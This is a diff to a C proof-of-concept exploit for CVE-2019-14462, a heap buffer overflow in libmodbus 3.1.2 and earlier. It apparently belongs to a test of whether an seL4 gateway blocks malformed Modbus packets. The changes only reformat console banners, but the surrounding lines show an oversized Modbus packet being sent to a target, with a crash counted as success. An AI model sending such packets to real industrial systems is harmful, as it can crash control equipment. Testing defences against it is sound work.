@@ -123,26 +123,26 @@ static void build_exploit_packet(uint8_t *query) {
 
 static void print_packet_info(const uint8_t *query) {
     printf("\n");
-    printf("┌────────────────────────────────────────────────────────────┐\n");
-    printf("│ CVE-2019-14462 Exploit Packet                              │\n");
-    printf("├────────────────────────────────────────────────────────────┤\n");
-    printf("│ MBAP Header:                                               │\n");
-    printf("│   Transaction ID: 0x%02X%02X                                  │\n", query[0], query[1]);
-    printf("│   Protocol ID:    0x%02X%02X (Modbus)                         │\n", query[2], query[3]);
-    printf("│   Declared Len:   %d bytes  ← LIES!                        │\n", DECLARED_LENGTH);
-    printf("│   Unit ID:        0x%02X                                     │\n", query[6]);
-    printf("├────────────────────────────────────────────────────────────┤\n");
-    printf("│ PDU:                                                       │\n");
-    printf("│   Function Code:  0x%02X (Read Holding Registers)           │\n", query[7]);
-    printf("│   Start Address:  0x%02X%02X                                  │\n", query[8], query[9]);
-    printf("│   Quantity:       %d registers                              │\n", (query[10] << 8) | query[11]);
-    printf("├────────────────────────────────────────────────────────────┤\n");
-    printf("│ Exploit:                                                   │\n");
-    printf("│   Declared size:  %d bytes                                 │\n", DECLARED_LENGTH);
-    printf("│   Actual size:    %d bytes                                │\n", ACTUAL_PDU_LENGTH);
-    printf("│   Overflow:       %d bytes beyond buffer!                 │\n", ACTUAL_PDU_LENGTH - DECLARED_LENGTH);
-    printf("│   Pattern:        0xDEADBEEF (repeating)                   │\n");
-    printf("└────────────────────────────────────────────────────────────┘\n");
+    printf("┌──────────────────────────────────────┐\n");
+    printf("│ CVE-2019-14462 Exploit Packet        │\n");
+    printf("├──────────────────────────────────────┤\n");
+    printf("│ MBAP Header:                         │\n");
+    printf("│  Trans ID:  0x%02X%02X                  │\n", query[0], query[1]);
+    printf("│  Protocol:  0x%02X%02X (Modbus)         │\n", query[2], query[3]);
+    printf("│  Declared:  %d bytes ← LIES!        │\n", DECLARED_LENGTH);
+    printf("│  Unit ID:   0x%02X                     │\n", query[6]);
+    printf("├──────────────────────────────────────┤\n");
+    printf("│ PDU:                                 │\n");
+    printf("│  Func: 0x%02X (Read Holding Regs)     │\n", query[7]);
+    printf("│  Addr: 0x%02X%02X                       │\n", query[8], query[9]);
+    printf("│  Qty:  %d registers                  │\n", (query[10] << 8) | query[11]);
+    printf("├──────────────────────────────────────┤\n");
+    printf("│ Exploit:                             │\n");
+    printf("│  Declared: %d bytes                 │\n", DECLARED_LENGTH);
+    printf("│  Actual:   %d bytes                │\n", ACTUAL_PDU_LENGTH);
+    printf("│  Overflow: %d bytes!               │\n", ACTUAL_PDU_LENGTH - DECLARED_LENGTH);
+    printf("│  Pattern:  0xDEADBEEF               │\n");
+    printf("└──────────────────────────────────────┘\n");
     printf("\n");
 }
 
@@ -160,10 +160,10 @@ int main(int argc, char *argv[]) {
         return EXIT_FAILURE;
     }
 
-    printf("╔════════════════════════════════════════════════════════════╗\n");
-    printf("║  CVE-2019-14462: libmodbus Heap Buffer Overflow            ║\n");
-    printf("║  Affects: libmodbus <= 3.1.2                               ║\n");
-    printf("╚════════════════════════════════════════════════════════════╝\n");
+    printf("╔══════════════════════════════════════╗\n");
+    printf("║ CVE-2019-14462: Heap Overflow        ║\n");
+    printf("║ Affects: libmodbus <= 3.1.2          ║\n");
+    printf("╚══════════════════════════════════════╝\n");
     printf("\n");
     printf("[*] Target: %s:%d\n", target_ip, target_port);
     printf("[*] Packet size: %d bytes (declared: %d)\n", QUERY_SIZE, DECLARED_LENGTH);
@@ -214,23 +214,24 @@ int main(int argc, char *argv[]) {
     }
 
     printf("\n");
-    printf("╔════════════════════════════════════════════════════════════╗\n");
-    printf("║  RESULT                                                    ║\n");
-    printf("╠════════════════════════════════════════════════════════════╣\n");
+    printf("╔══════════════════════════════════════╗\n");
+    printf("║ RESULT                               ║\n");
+    printf("╠══════════════════════════════════════╣\n");
     if (received <= 0) {
-        printf("║  Server crashed or timed out - exploit likely succeeded!  ║\n");
-        printf("║                                                            ║\n");
-        printf("║  The heap buffer overflow corrupted server memory.         ║\n");
-        printf("║  Check server logs or run with AddressSanitizer to verify. ║\n");
+        printf("║ Server crashed/timeout!              ║\n");
+        printf("║ Exploit likely succeeded.            ║\n");
+        printf("║                                      ║\n");
+        printf("║ Heap overflow corrupted memory.      ║\n");
+        printf("║ Check logs or run with ASAN.         ║\n");
     } else {
-        printf("║  Server responded normally.                                ║\n");
-        printf("║                                                            ║\n");
-        printf("║  Possible reasons:                                         ║\n");
-        printf("║  • Server is patched (libmodbus > 3.1.2)                   ║\n");
-        printf("║  • seL4 gateway blocked the malformed packet               ║\n");
-        printf("║  • Server has other mitigations                            ║\n");
+        printf("║ Server responded normally.           ║\n");
+        printf("║                                      ║\n");
+        printf("║ Possible reasons:                    ║\n");
+        printf("║ • Patched (libmodbus > 3.1.2)       ║\n");
+        printf("║ • seL4 blocked malformed packet     ║\n");
+        printf("║ • Other mitigations in place        ║\n");
     }
-    printf("╚════════════════════════════════════════════════════════════╝\n");
+    printf("╚══════════════════════════════════════╝\n");
 
     close(sock);
     return EXIT_SUCCESS;
